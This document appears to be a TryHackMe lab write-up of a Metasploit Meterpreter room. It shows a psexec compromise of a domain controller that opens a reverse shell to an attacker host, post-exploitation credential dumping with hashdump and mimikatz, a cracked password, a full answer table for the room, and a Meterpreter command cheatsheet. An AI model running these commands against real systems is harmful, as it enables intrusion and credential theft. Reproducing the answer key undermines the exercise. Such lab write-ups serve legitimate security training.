@@ -1,0 +1,102 @@
+Metasploit: Meterpreter
+Path: Cyber Security 101 → Exploitation Basics
+Room URL: https://tryhackme.com/room/meterpreter
+Difficulty: Easy
+Completed: 27 May 2026
+
+Overview
+This room takes a deep dive into Meterpreter, the in-memory payload from the Metasploit framework. The focus is on post-exploitation: gathering information, dumping credentials, and pivoting on a compromised Windows host. The challenge at the end simulates an initial SMB compromise and asks you to enumerate the target.
+
+Tools Used
+
+Metasploit Framework (msfconsole)
+exploit/windows/smb/psexec
+Meterpreter (windows/x64/meterpreter/reverse_tcp)
+Kiwi extension (mimikatz)
+nmap
+
+
+Initial Recon
+Started with an nmap scan against the target to confirm SMB was reachable.
+bashnmap -p 445 -Pn 10.145.173.255
+Output showed the host was actually a Domain Controller — Kerberos (88), LDAP (389), SMB (445), and Global Catalog (3268/3269) were all open. Important detail because it means we need to authenticate against a domain, not a workgroup.
+PORT     STATE SERVICE
+53/tcp   open  domain
+80/tcp   open  http
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+3268/tcp open  globalcatLDAP
+3389/tcp open  ms-wbt-server
+
+Exploitation — Initial Foothold via PSExec
+Used the provided credentials (ballen:Password1) to authenticate over SMB and drop a Meterpreter payload.
+msfconsole
+use exploit/windows/smb/psexec
+set RHOSTS 10.145.173.255
+set SMBUser ballen
+set SMBPass Password1
+set SMBDomain FLASH
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST <attacker IP>
+run
+Troubleshooting note
+The exploit failed initially with STATUS_LOGON_FAILURE (0xc000006d). The issue was that SMBDomain was set to the default . (local machine). Since the target is a domain controller, the domain FLASH had to be explicitly set. Once SMBDomain FLASH was applied, authentication succeeded:
+[*] 10.145.173.255:445 - Authenticating to 10.145.173.255:445|FLASH as user 'ballen'...
+[*] 10.145.173.255:445 - Selecting PowerShell target
+[*] 10.145.173.255:445 - Executing the payload...
+[*] Meterpreter session 1 opened
+Lesson learned: Always set SMBDomain when targeting a DC — even if the credentials are correct, missing the domain will throw a logon failure.
+
+Post-Exploitation
+System info
+meterpreter > sysinfo
+Computer        : ACME-TEST
+OS              : Windows ...
+Domain          : FLASH
+Enumerating shares
+Identified a non-default share named speedster that was likely user-created.
+Dumping credentials
+Used hashdump (and kiwi's lsa_dump_sam as a backup) to grab the local SAM hashes. The hash for jchambers was:
+69596c7aa1e8daee17f8e78870e25a5c
+Cracked offline against rockyou.txt (or via the room's hint) → cleartext: Trustno1.
+Hunting for secrets
+meterpreter > cat "c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt"
+My Twitter password is KDSvbsw3849!
+Then searched the whole filesystem for the second secret:
+meterpreter > search -f realsecret.txt
+Found 1 result...
+c:\inetpub\wwwroot\realsecret.txt   34 bytes
+meterpreter > cat "c:\inetpub\wwwroot\realsecret.txt"
+The Flash is the fastest man alive
+
+Answers
+QuestionAnswerComputer nameACME-TESTTarget domainFLASHUser-created sharespeedsterNTLM hash of jchambers69596c7aa1e8daee17f8e78870e25a5cCleartext password of jchambersTrustno1Location of secrets.txtc:\Program Files (x86)\Windows Multimedia Platform\secrets.txtTwitter password in secrets.txtKDSvbsw3849!Location of realsecret.txtc:\inetpub\wwwroot\realsecret.txtThe real secretThe Flash is the fastest man alive
+
+Key Takeaways
+
+SMBDomain matters — when the target is a domain controller, the default . won't work. Set the actual domain or psexec will throw STATUS_LOGON_FAILURE even with valid credentials.
+auxiliary/scanner/smb/smb_login is a useful diagnostic — it isolates whether the credentials work without involving exploit-stage complications.
+search -f <filename> in Meterpreter does a full filesystem search; -d <path> narrows it down for speed.
+PSExec via Metasploit authenticates over SMB and then uses ADMIN$ to drop a service executable that runs the payload — that's why the user needs admin rights and SMB needs to be reachable.
+Kiwi (mimikatz) loaded via load kiwi opens up creds_all, lsa_dump_sam, and DCSync options for deeper credential extraction.
+
+
+Commands Cheatsheet
+bash# Meterpreter essentials
+sysinfo                          # Target OS, hostname, domain
+getuid                           # Current user
+getsystem                        # Privesc to SYSTEM
+hashdump                         # Dump local SAM hashes
+load kiwi                        # Load mimikatz
+creds_all                        # Dump all credentials
+lsa_dump_sam                     # Raw SAM dump
+search -f <file>                 # Search whole filesystem
+search -d <dir> -f <file>        # Narrow search to a directory
+cat "<path>"                     # Read a file
+download <path>                  # Pull file to attacker
+shell                            # Drop into cmd.exe
+
+Status: ✅ Completed
